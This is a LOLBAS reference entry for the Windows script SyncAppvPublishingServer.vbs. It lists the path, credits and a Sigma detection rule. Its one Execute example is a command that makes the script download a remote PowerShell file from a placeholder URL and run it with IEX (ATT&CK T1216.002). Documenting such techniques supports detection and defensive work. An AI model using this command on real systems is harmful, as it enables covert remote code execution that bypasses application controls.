---
title: "Syncappvpublishingserver.vbs"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/
fetched_at: 2026-09-20T17:16:39Z
license: unspecified
category: windows
---

Script used related to app-v and publishing server

## Paths
- C:\Windows\System32\SyncAppvPublishingServer.vbs

## Resources
- [https://twitter.com/monoxgas/status/895045566090010624](https://twitter.com/monoxgas/status/895045566090010624)
- [https://twitter.com/subTee/status/855738126882316288](https://twitter.com/subTee/status/855738126882316288)

## Acknowledgements
- Nick Landers ([@monoxgas](https://twitter.com/@monoxgas))
- Casey Smith ([@subtee](https://twitter.com/@subtee))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml)

## Execute

1. Inject PowerShell script code with the provided arguments

```
SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
```

   - Use case: Use Powershell host invoked from vbs script

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1216.002

   - Tags: Execute: PowerShell
